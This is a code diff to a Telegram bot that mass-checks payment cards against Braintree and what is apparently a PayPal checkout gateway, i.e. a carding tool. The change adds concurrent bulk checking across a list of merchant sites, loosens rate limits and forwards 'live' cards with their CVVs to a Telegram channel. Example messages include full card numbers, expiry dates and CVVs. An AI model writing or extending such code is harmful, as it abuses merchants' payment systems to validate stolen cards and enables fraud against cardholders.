@@ -22,6 +22,7 @@ from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQuer
 
 # Import ppcp module for /pp command
 sys.path.append(os.path.join(os.path.dirname(__file__), 'ppcp'))
+import asyncio
 
 # Disable SSL warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -46,7 +47,7 @@ pending_approvals_lock = threading.Lock()
 # Rate limiting: user_id -> last_check_time
 user_rate_limit = {}
 user_rate_limit_lock = threading.Lock()
-RATE_LIMIT_SECONDS = 3  # Minimum seconds between checks per user
+RATE_LIMIT_SECONDS = 1  # Minimum seconds between checks per user (1 second as requested)
 
 # REMOVED: Global variables for resource selection (now using per-request local variables)
 # This prevents conflicts when multiple users check cards simultaneously
@@ -750,16 +751,30 @@ def check_card(cc_line):
         return f"❌ Error: {str(e)}", None, None
 
 
+async def check_ppcp_mass_cards(card_list, site_urls, max_concurrent=10):
+    """Check multiple cards using async PPCP gateway with controlled concurrency"""
+    try:
+        from ppcp.async_ppcpgatewaycvv import check_multiple_cards
+        results = await check_multiple_cards(card_list, site_urls, max_concurrent)
+        return results
+    except Exception as e:
+        return [f"❌ Error in mass check: {str(e)}"] * len(card_list)
+
+
 # ============= TELEGRAM BOT HANDLERS =============
 
 async def forward_to_channel(context: ContextTypes.DEFAULT_TYPE, card_details: str, result: str):
     """Forward approved card to the configured channel"""
     if FORWARD_CHANNEL_ID is None:
         return  # Forwarding disabled
-    
+
     try:
         # Check if the result indicates an approved card
-        if "APPROVED" in result and "✅" in result:
+        # For auth gateway: "APPROVED" and "✅"
+        # For PPCP gateway: "CCN" or "CVV" with "✅"
+        if ("APPROVED" in result and "✅" in result) or \
+           ("CCN" in result and "✅" in result) or \
+           ("CVV" in result and "✅" in result):
             # Send the result to the channel
             await context.bot.send_message(
                 chat_id=FORWARD_CHANNEL_ID,
@@ -788,7 +803,7 @@ Commands:
 /start - Show this message
 /b3 <card> - Check a single card (Braintree Auth)
 /b3s <cards> - Check multiple cards (Braintree Auth)
-/pp <card> - Check a single card (PPCP Gateway)
+/pp <card/cards> - Check single or multiple cards (PPCP Gateway)
 
 Single Card Examples:
 /b3 5156123456789876|11|29|384
@@ -798,6 +813,10 @@ Mass Check Examples:
 /b3s 5401683112957490|10|2029|741
 4386680119536105|01|2029|147
 4284303806640816 0628 116
+
+/pp 5401683112957490|10|2029|741
+4386680119536105|01|2029|147
+4000223361770415|04|2029|639
 
 Supported formats:
 - number|mm|yy|cvv
@@ -1048,13 +1067,12 @@ async def b3s_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def pp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /pp command for ppcp gateway checking with rate limiting"""
+    """Handle /pp command for ppcp gateway checking with rate limiting and mass checking support"""
     user_id = update.effective_user.id
+    is_admin = user_id == ADMIN_ID
 
-    # Check if user is admin
-    if user_id == ADMIN_ID:
-        pass  # Admin always has access
-    elif not is_user_approved(user_id):
+    # Check if user is admin or approved
+    if not is_admin and not is_user_approved(user_id):
         await update.message.reply_text(
             "❌ You don't have access to use this bot.\n"
             f"Your User ID: `{user_id}`\n\n"
@@ -1063,63 +1081,184 @@ async def pp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # Rate limiting check (thread-safe)
-    with user_rate_limit_lock:
-        current_time = time.time()
-        last_check_time = user_rate_limit.get(user_id, 0)
-        time_since_last_check = current_time - last_check_time
-
-        if time_since_last_check < RATE_LIMIT_SECONDS:
-            wait_time = RATE_LIMIT_SECONDS - time_since_last_check
-            await update.message.reply_text(
-                f"⏳ Please wait {wait_time:.1f} seconds before checking another card.\n"
-                "This prevents overloading the system."
-            )
-            return
-
-        # Update last check time
-        user_rate_limit[user_id] = current_time
-
     # Check if card details are provided
     if not context.args:
         await update.message.reply_text(
             "❌ Please provide card details.\n\n"
-            "Format: /pp number|mm|yy|cvv\n"
-            "Examples: \n/pp 4315037547717888|10|28|852\n/pp 4315037547717888|10|2028|852"
+            "Single Card Format: /pp number|mm|yy|cvv\n"
+            "Mass Check Format:\n/pp 5401683112957490|10|2029|741\n4386680119536105|01|2029|147\n4000223361770415|04|2029|639"
         )
         return
 
-    card_details = ' '.join(context.args)
+    # Parse cards from message (support multiline input)
+    message_text = update.message.text
+    # Remove the /pp command
+    cards_text = message_text.replace('/pp', '', 1).strip()
 
-    # Validate card format (should have 3 pipes for 4 parts)
-    if card_details.count('|') != 3:
+    # Split by newlines to get individual cards
+    card_lines = [line.strip() for line in cards_text.split('\n') if line.strip()]
+
+    if not card_lines:
         await update.message.reply_text(
-            "❌ Invalid card format.\n\n"
-            "Format: /pp number|mm|yy|cvv\n"
-            "Examples: \n/pp 4315037547717888|10|28|852\n/pp 4315037547717888|10|2028|852"
+            "❌ No valid cards found.\n\n"
+            "Format:\n"
+            "Single: /pp number|mm|yy|cvv\n"
+            "Mass: /pp 5401683112957490|10|2029|741\n4386680119536105|01|2029|147"
         )
         return
 
-    # Send "Checking Please Wait" message
-    checking_msg = await update.message.reply_text("⏳ Checking Please Wait...")
-
-    try:
+    # Normalize all cards
+    normalized_cards = []
+    for card_line in card_lines:
         # Import ppcp module dynamically
         import ppcpgatewaycvv
+        normalized = ppcpgatewaycvv.normalize_card_format(card_line)
+        if normalized:
+            normalized_cards.append(normalized)
+        else:
+            await update.message.reply_text(
+                f"❌ Invalid card format: {card_line}\n\n"
+                "Supported formats:\n"
+                "- number|mm|yy|cvv\n"
+                "- number mmyy cvv"
+            )
+            return
 
-        # Normalize the card format (handle 2-digit year)
-        normalized_card = ppcpgatewaycvv.normalize_card_format(card_details)
+    total_cards = len(normalized_cards)
 
-        # Check the card using ppcp module
-        result = ppcpgatewaycvv.check_single_card(normalized_card)
+    # Handle single card vs mass checking
+    if total_cards == 1:
+        # Single card - apply rate limiting for non-admin users
+        if not is_admin:
+            with user_rate_limit_lock:
+                current_time = time.time()
+                last_check_time = user_rate_limit.get(user_id, 0)
+                time_since_last_check = current_time - last_check_time
 
-        # Edit the message with the result
-        await checking_msg.edit_text(result)
+                if time_since_last_check < RATE_LIMIT_SECONDS:
+                    wait_time = RATE_LIMIT_SECONDS - time_since_last_check
+                    await update.message.reply_text(
+                        f"⏳ Please wait {wait_time:.1f} seconds before checking another card.\n"
+                        "This prevents overloading the system."
+                    )
+                    return
 
-    except Exception as e:
-        error_message = f"❌ Error checking card: {str(e)}"
-        await checking_msg.edit_text(error_message)
-        print(f"Error in /pp command: {str(e)}")
+                # Update last check time
+                user_rate_limit[user_id] = current_time
+
+        # Send "Checking Please Wait" message
+        checking_msg = await update.message.reply_text("⏳ Checking Please Wait...")
+
+        try:
+            # Check the single card using async ppcp gateway
+            # Load sites from sites.txt file
+            sites = []
+            if os.path.exists('ppcp/sites.txt'):
+                with open('ppcp/sites.txt', 'r') as f:
+                    sites = [line.strip() for line in f if line.strip()]
+            else:
+                # Load from the project root if ppcp folder is not present in the path
+                if os.path.exists('sites.txt'):
+                    with open('sites.txt', 'r') as f:
+                        sites = [line.strip() for line in f if line.strip()]
+
+            if not sites:
+                result = "❌ No sites found!"
+            else:
+                from ppcp.async_ppcpgatewaycvv import check_single_card
+                result = await check_single_card(normalized_cards[0], sites)
+
+            # Edit the message with the result
+            await checking_msg.edit_text(result)
+
+            # Forward to channel if approved
+            await forward_to_channel(context, normalized_cards[0], result)
+
+        except Exception as e:
+            error_message = f"❌ Error checking card: {str(e)}"
+            await checking_msg.edit_text(error_message)
+            print(f"Error in /pp command: {str(e)}")
+
+    else:
+        # Mass checking - apply rate limiting between cards for non-admin users
+        # Send initial status message
+        status_msg = await update.message.reply_text(
+            f"⏳ Checking {total_cards} card(s)...\n"
+            f"Progress: 0/{total_cards}"
+        )
+
+        # Load sites from sites.txt file
+        sites = []
+        if os.path.exists('ppcp/sites.txt'):
+            with open('ppcp/sites.txt', 'r') as f:
+                sites = [line.strip() for line in f if line.strip()]
+        else:
+            # Load from the project root if ppcp folder is not present in the path
+            if os.path.exists('sites.txt'):
+                with open('sites.txt', 'r') as f:
+                    sites = [line.strip() for line in f if line.strip()]
+
+        if not sites:
+            await status_msg.edit_text("❌ No sites found!")
+            return
+
+        # Check all cards with 10 concurrent bots
+        results = await check_ppcp_mass_cards(normalized_cards, sites, max_concurrent=10)
+
+        # Process results
+        approved_count = 0
+        declined_count = 0
+
+        for idx, result in enumerate(results):
+            # Rate limiting for non-admin users (between cards in mass check)
+            if not is_admin and idx > 0:
+                with user_rate_limit_lock:
+                    current_time = time.time()
+                    last_check_time = user_rate_limit.get(user_id, 0)
+                    time_since_last_check = current_time - last_check_time
+
+                    if time_since_last_check < RATE_LIMIT_SECONDS:
+                        wait_time = RATE_LIMIT_SECONDS - time_since_last_check
+                        await asyncio.sleep(wait_time)
+
+                    # Update last check time
+                    user_rate_limit[user_id] = time.time()
+
+            # Count approved/declined
+            if ("CCN" in result and "✅" in result) or ("CVV" in result and "✅" in result):
+                approved_count += 1
+                # Forward to channel if approved
+                await forward_to_channel(context, normalized_cards[idx], result)
+            else:
+                declined_count += 1
+
+            # Send result immediately after checking
+            card_result = f"Card {idx + 1}/{total_cards}:\n{result}"
+            await update.message.reply_text(card_result)
+
+            # Update progress every card
+            try:
+                await status_msg.edit_text(
+                    f"⏳ Checking {total_cards} card(s)...\n"
+                    f"Progress: {idx + 1}/{total_cards}\n"
+                    f"✅ Approved: {approved_count} | ❌ Declined: {declined_count}"
+                )
+            except:
+                pass  # Ignore edit errors (e.g., message not modified)
+
+        # Send final summary
+        summary = f"📊 Mass Check Complete\n\n"
+        summary += f"Total Cards: {total_cards}\n"
+        summary += f"✅ Approved: {approved_count}\n"
+        summary += f"❌ Declined: {declined_count}"
+
+        await update.message.reply_text(summary)
+
+        # Delete the progress message
+        try:
+            await status_msg.delete()
+        except:
+            pass
 
 async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /approve command (admin only)"""
